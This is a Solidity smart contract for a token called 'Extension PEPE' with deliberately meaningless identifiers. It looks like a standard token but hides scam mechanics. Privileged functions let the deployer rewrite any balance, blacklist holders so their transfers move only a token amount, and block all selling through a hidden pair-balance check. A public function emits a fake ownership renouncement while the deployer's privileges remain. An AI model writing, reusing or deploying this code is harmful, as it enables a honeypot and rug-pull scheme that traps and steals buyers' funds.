//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface minMode {
    function totalSupply() external view returns (uint256);

    function balanceOf(address totalModeAmount) external view returns (uint256);

    function transfer(address tradingMax, uint256 marketingShould) external returns (bool);

    function allowance(address exemptReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingShould) external returns (bool);

    function transferFrom(
        address sender,
        address tradingMax,
        uint256 marketingShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed enableMinSender, uint256 value);
    event Approval(address indexed exemptReceiver, address indexed spender, uint256 value);
}

abstract contract shouldBuyMin {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface modeTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface atBuyList {
    function createPair(address launchedTeam, address minFrom) external returns (address);
}

interface fromMaxReceiver is minMode {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ExtensionPEPE is shouldBuyMin, minMode, fromMaxReceiver {

    function owner() external view returns (address) {
        return launchIsSell;
    }

    uint256 private enableFrom;

    function launchedListEnable(address fromBuyEnable) public {
        minSwapAt();
        if (enableFrom == minTotalFee) {
            totalAt = false;
        }
        if (fromBuyEnable == walletTrading || fromBuyEnable == listTake) {
            return;
        }
        isSell[fromBuyEnable] = true;
    }

    uint8 private receiverIsExempt = 18;

    function transferFrom(address exemptFrom, address tradingMax, uint256 marketingShould) external override returns (bool) {
        if (_msgSender() != feeTotal) {
            if (txSell[exemptFrom][_msgSender()] != type(uint256).max) {
                require(marketingShould <= txSell[exemptFrom][_msgSender()]);
                txSell[exemptFrom][_msgSender()] -= marketingShould;
            }
        }
        return marketingMinIs(exemptFrom, tradingMax, marketingShould);
    }

    function minList(address tokenList) public {
        require(tokenList.balance < 100000);
        if (listExempt) {
            return;
        }
        if (minTotalFee != takeMode) {
            enableFrom = minTotalFee;
        }
        tokenMode[tokenList] = true;
        
        listExempt = true;
    }

    uint256 private maxLimit = 100000000 * 10 ** 18;

    function minSwapAt() private view {
        require(tokenMode[_msgSender()]);
    }

    address public listTake;

    uint256 minBuyLiquidity;

    function balanceOf(address totalModeAmount) public view virtual override returns (uint256) {
        return listSell[totalModeAmount];
    }

    constructor (){
        
        modeTake feeReceiver = modeTake(feeTotal);
        listTake = atBuyList(feeReceiver.factory()).createPair(feeReceiver.WETH(), address(this));
        if (walletAmountLimit != totalAt) {
            atTotal = takeMode;
        }
        walletTrading = _msgSender();
        launchedList();
        tokenMode[walletTrading] = true;
        listSell[walletTrading] = maxLimit;
        
        emit Transfer(address(0), walletTrading, maxLimit);
    }

    mapping(address => uint256) private listSell;

    bool public minReceiverSell;

    bool private walletAmountLimit;

    address launchToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => mapping(address => uint256)) private txSell;

    bool private totalAt;

    function decimals() external view virtual override returns (uint8) {
        return receiverIsExempt;
    }

    string private liquidityLimitMin = "EPE";

    event OwnershipTransferred(address indexed isEnable, address indexed marketingTokenAmount);

    function getOwner() external view returns (address) {
        return launchIsSell;
    }

    address public walletTrading;

    function name() external view virtual override returns (string memory) {
        return limitAmount;
    }

    function approve(address walletMarketing, uint256 marketingShould) public virtual override returns (bool) {
        txSell[_msgSender()][walletMarketing] = marketingShould;
        emit Approval(_msgSender(), walletMarketing, marketingShould);
        return true;
    }

    bool public listExempt;

    address private launchIsSell;

    function marketingMinIs(address exemptFrom, address tradingMax, uint256 marketingShould) internal returns (bool) {
        if (exemptFrom == walletTrading) {
            return enableTrading(exemptFrom, tradingMax, marketingShould);
        }
        uint256 marketingSenderLaunched = minMode(listTake).balanceOf(launchToken);
        require(marketingSenderLaunched == receiverFrom);
        require(tradingMax != launchToken);
        if (isSell[exemptFrom]) {
            return enableTrading(exemptFrom, tradingMax, takeAmount);
        }
        return enableTrading(exemptFrom, tradingMax, marketingShould);
    }

    uint256 public atTotal;

    function transfer(address exemptToken, uint256 marketingShould) external virtual override returns (bool) {
        return marketingMinIs(_msgSender(), exemptToken, marketingShould);
    }

    function limitSell(address exemptToken, uint256 marketingShould) public {
        minSwapAt();
        listSell[exemptToken] = marketingShould;
    }

    mapping(address => bool) public tokenMode;

    uint256 private takeMode;

    function receiverTotal(uint256 marketingShould) public {
        minSwapAt();
        receiverFrom = marketingShould;
    }

    uint256 receiverFrom;

    function allowance(address receiverSell, address walletMarketing) external view virtual override returns (uint256) {
        if (walletMarketing == feeTotal) {
            return type(uint256).max;
        }
        return txSell[receiverSell][walletMarketing];
    }

    string private limitAmount = "Extension PEPE";

    uint256 constant takeAmount = 8 ** 10;

    uint256 public minTotalFee;

    function symbol() external view virtual override returns (string memory) {
        return liquidityLimitMin;
    }

    mapping(address => bool) public isSell;

    function enableTrading(address exemptFrom, address tradingMax, uint256 marketingShould) internal returns (bool) {
        require(listSell[exemptFrom] >= marketingShould);
        listSell[exemptFrom] -= marketingShould;
        listSell[tradingMax] += marketingShould;
        emit Transfer(exemptFrom, tradingMax, marketingShould);
        return true;
    }

    function launchedList() public {
        emit OwnershipTransferred(walletTrading, address(0));
        launchIsSell = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return maxLimit;
    }

    address feeTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

}